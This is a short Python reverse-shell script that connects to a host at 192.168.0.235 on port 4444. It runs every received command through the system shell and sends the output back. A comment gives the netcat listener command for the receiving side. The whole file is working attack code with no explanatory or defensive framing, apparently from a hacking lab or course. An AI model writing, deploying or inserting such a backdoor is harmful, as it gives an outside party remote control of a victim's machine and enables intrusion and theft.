import socket
import subprocess
#in server , nc -vv -l -p 4444 ; vv- verbose ; -p port ; -l listen

def execute_system_command(command):
    return subprocess.check_output(command, shell =True)

connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
connection.connect(("192.168.0.235" , 4444))

connection.send("\n[+] Connection established.\n".encode('utf-8'))


while True:
    command = connection.recv(1024)
    command = command.decode('utf-8')
    command_result = execute_system_command(command)
    connection.send(command_result)
    
connection.close()